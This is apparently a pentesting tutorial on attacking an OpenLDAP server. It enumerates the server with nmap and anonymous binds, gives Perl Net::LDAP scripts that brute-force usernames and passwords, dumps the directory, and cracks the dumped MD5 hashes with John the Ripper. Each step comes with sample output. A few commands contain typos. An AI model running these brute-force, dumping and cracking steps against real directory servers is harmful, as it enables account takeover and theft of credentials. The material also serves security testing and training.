# Pentesting LDAP Servers
#LDAP #NMAP #john #ldap_bind #ldapsearch

### Enumeration
We first start by scanning the host with ```nmap``` to verify if port 389 is indeed open.

```bash
sudo nmap 7sV -p389 148.32.42.5
```
```bash
Starting Nmap 7.01 ( [https://nmap.org](https://nmap.org/) ) at 2019-01-22 10:55 MST  
Nmap scan report for ldap.acme.com (148.32.42.5)  
Host is up (0.00014s latency).  
PORT    STATE SERVICE VERSION  
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.XService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds  
sam@asus:~%
```
As we can see nmap reports back to us that the is indeed open and running the LDAP service. Anonymous Bind Our next test is to see if this LDAP server is vulnerable to a NULL base or anonymous bind. We will search for all Distinguished Names (DN) in the tree.
```bash
ldapsearch -x -b "dc=acme,dc=com" "*" -h 148.32.42.5 | awk '/dn: / {print $2}'
```
```bash
dc=acme,dc=com  
cn=admin,dc=acme,dc=com  
cn=ldapusers,dc=acme,dc=com  
cn=evelyn  
cn=sales,dc=acme,dc=com  
ou=direct,cn=sales,dc=acme,dc=com  
ou=channel,cn=sales,dc=acme,dc=com  
cn=support,dc=acme,dc=com  
cn=training,dc=acme,dc=com  
ou=helpdesk,cn=support,dc=acme,dc=com  
ou=escalation,cn=support,dc=acme,dc=com  
ou=instructors,cn=training,dc=acme,dc=com  
ou=course  
cn=chris  
cn=sam  
cn=justin  
cn=heath  
cn=nick  
cn=eric  
cn=tim  
cn=vaj  
sam@asus:~%
```
In this case anonymous bind is allowed and we are able to traverse the directory tree as we would if we were a authenticated user. We can go further by pilfering through the directory and find all the user and user names on the server.

### Unauthenticated Bind Enumeration (DN with no password)

Lets try a search for all user id’s in the directory subtree using the DN `cn=admin,dc=acme,dc=com` and no password.
```bash
ldapsearch -x -D "cn=admin,dc=acme,dc=com" -s sub "cn=*" -h 148.32.42.5 | awk '/uid: /{print $2}' | nl
```
```bash
     1 esampson
     2 cchiu
     3 skumar
     4 jsmith
     5 hahmad
     6 nolsen
     7 ealvarez
     8 tmoreau
     9 vpatel
```
This what you will see if you come upon a server where unauthenticated binds are disallowed:
```bash
ldapsearch -x -D "cn=admin,dc=acme,dc=com" -s sub "cn=*" -h 148.32.42.5  
```
```bash
ldap_bind: Server is unwilling to perform (53)  
additional info: unauthenticated bind (DN with no password) disallowed 
```
Unauthenticated Binds are only allowed if Anonymous Binds are also enabled.

### Authenticated Bind Enumeration

For a authenticated ```LDAP``` bind we need to crack some passwords, preferably the ```ldap``` administrators. We also need identify the authentication used such as md5 ,etc.

We can get the authentication method by using a bogus password and trying to login
```bash
ldapwhoami -h ldap.acme.com -w "abcd123"
```
```bash
SASL/DIGEST-MD5 authentication started  
ldap_sasl_interactive_bind_s: Invalid credentials (49)  
 additional info: SASL(-13): user not found: no secret in database  
```

### Dictonary attack to find valid users

We can use Perl and the Net::LDAP module to check for valid users on the remote LDAP server. The simple script below searches for valid users and returns a distinguished name if found. This will help us in our next step which is to guess passwords for the accounts we find in this search. You can get some ideas on username guessing from [Enumerating UNIX usernames](https://cxyy4rle.blogspot.com/2019/04/enumerating-unix-usernames.html)
```perl
#!/usr/bin/env perl  
use strict;  
use warnings;  
use Net::LDAP;my $server   = "ldap.acme.com";  
my $base     = "dc=acme,dc=com";  
my $filename = "users.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;while (my $word = <$fh>) {  
    chomp($word); my $search = $ldap->search(  
        base    => $base,  
        scope   => 'sub',  
        filter  => '(&(uid='.$word.'))',  
        attrs   => ['dn']  
    ); print "[+] Found valid login name $word\n" if(defined($search->entry));  
}
```
We now run the script and fuzz for users on the server
```bash
./ldap-users.pl   
```
```bash
[+] Found valid login name twest  
[+] Found valid login name vpatel  
[+] Found valid login name hahmad  
[+] Found valid login name ealvarez  
[+] Found valid login name skumar  
[+] Found valid login name tmoreau  
[+] Found valid login name jsmith  
```

### Dictonary attack to find valid password
Once we have a valid list of users on the server, we can move forward to search for valid user and password combinations. We can use Perl and Net::LDAP to query the server and test for valid logins.
```perl
#!/usr/bin/env perl  
use strict;  
use warnings;  
use Net::LDAP;my $server   = "ldap.acme.com";  
my $user     = "twest";  
my $base     = "dc=acme,dc=com";  
my $filename = "wordlist.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;my $search = $ldap->search(  
    base    => $base,  
    scope   => 'sub',  
    filter  => '(&(uid='.$user.'))',  
    attrs   => ['dn']  
);if(defined($search->entry)) { my $user_dn = $search->entry->dn; print "[*] Searching for valid LDAP login for $user_dn...\n"; while (my $word = <$fh>) {  
        chomp($word); my $mesg = $ldap->bind($user_dn, password => $word); if ($mesg and $mesg->code() == 0) {  
            print "[+] Found valid login $user_dn / $word\n";  
            exit;  
        }  
    }  
} else {  
    print "[x] $user is not a valid LDAP user...\n";  
    exit;  
}print "[x] No valid LDAP logins found...\n";

Running the script against the server we get the following
```
```bash
./ldap-passwords.pl   
```
```bash
[*] Searching for valid LDAP login for cn=tim west,ou=channel,cn=sales,dc=acme,dc=com...  
[+] Found valid login cn=tim west,ou=channel,cn=sales,dc=acme,dc=com / password  
```

### Dumping data

If we do an ldap search with our user and pass with a search filter of **(objectClass=*)**, a dump of the whole directory tree from admin.

```bash
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com  
```
```bash
# extended LDIF  
#  
# LDAPv3  
# base  (default) with scope subtree  
# filter: (objectclass=*)  
# requesting: *   
## acme.com  
dn: dc=acme,dc=com  
objectClass: top  
objectClass: dcObject  
objectClass: organization  
o: Acme  
dc: acme# admin, acme.com  
dn: cn=admin,dc=acme,dc=com  
objectClass: simpleSecurityObject  
objectClass: organizationalRole  
cn: admin  
description: LDAP administrator  
userPassword:: e1NTSEF9SW5uaE9PdFRmdENveWhPUDFTUFVnSnNMZ3ZxSVA3aUw=# ldapusers, acme.com  
dn: cn=ldapusers,dc=acme,dc=com  
...  
```

### Cracking OpenLDAP Passwords
the password hashes are encoded in base64 we can easily decode the string to extract the hash
```bash
echo "e01ENX0wTHVBcXJ1R0diYmpVUlB3TG5KMUt3PT0=" | base64 -d  
{MD5}0LuAqruGGbbjURPwLnJ1Kw==
```
All these hashes can be loaded up in JTR and cracked to get shell access on the remote system.
```bash
john --wordlist=/home/sam/pentest_notes/rockyou.txt /home/sam/openldap.txt
```
```bash
Using default input encoding: UTF-8  
Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x3])  
Remaining 7 password hashes with no different salts  
Warning: no OpenMP support for this hash type, consider --fork=2  
Press 'q' or Ctrl-C to abort, almost any other key for status  
password         (hahmad)  
education        (ealvarez)  
kumar            (skumar)  
jsmith           (jsmith)  
instructor       (tmoreau)  
hindu            (vpatel)  
6g 0:00:00:04 DONE (2019-01-20 22:18) 1.360g/s 3252Kp/s 3252Kc/s 3363KC/s  filimani.¡Vamos!  
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably  
Session completed  
```
